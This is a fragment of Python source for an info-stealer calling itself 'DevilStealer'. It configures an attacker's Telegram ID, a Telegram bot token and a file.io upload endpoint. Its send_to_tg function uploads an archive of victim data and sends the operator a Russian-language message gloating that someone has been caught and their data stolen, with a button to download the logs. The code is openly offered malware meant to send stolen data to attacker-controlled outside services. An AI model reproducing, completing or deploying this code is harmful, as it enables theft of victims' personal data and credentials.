...
ADMIN_ID = "7428942854" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("7546542297:AAGsilaCfrFyYT6_u74WhkeQYvVkcLMTg-U")
...
def send_to_tg(archive_path):
    ...
    lnkkb.add(btn)
    bot.send_message(ADMIN_ID, "DevilStealer>>> АХХАХХАХ кто-то попался Данные были успешно украденны 😈! Скачайте логи по кнопке ниже", reply_markup=lnkkb)
